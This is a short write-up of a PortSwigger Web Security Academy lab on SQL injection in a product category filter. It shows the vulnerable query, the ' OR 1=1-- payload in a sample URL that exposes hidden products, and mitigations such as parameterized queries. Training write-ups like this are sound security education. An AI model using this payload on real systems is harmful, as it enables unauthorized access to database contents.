# SQL Injection in WHERE Clause – Retrieving Hidden Data

Platform: PortSwigger Web Security Academy  
Category: SQL Injection  
Level: Apprentice  

## Overview
This lab demonstrates a SQL injection vulnerability in a product category filter. 
User input is directly embedded into the SQL query without proper sanitization.

## Vulnerable Query

The application performs a query similar to:

SELECT * FROM products WHERE category = 'Pets'

## Exploitation

By modifying the category parameter:

' OR 1=1--

Payload example:

https://target.com/filter?category=Pets'+OR+1=1--

## Result

The condition `1=1` evaluates to TRUE and the database returns all products, including hidden ones.

## Impact

Attackers can retrieve sensitive or hidden data from the database.

## Mitigation

• Use parameterized queries  
• Validate user input  
• Use prepared statements
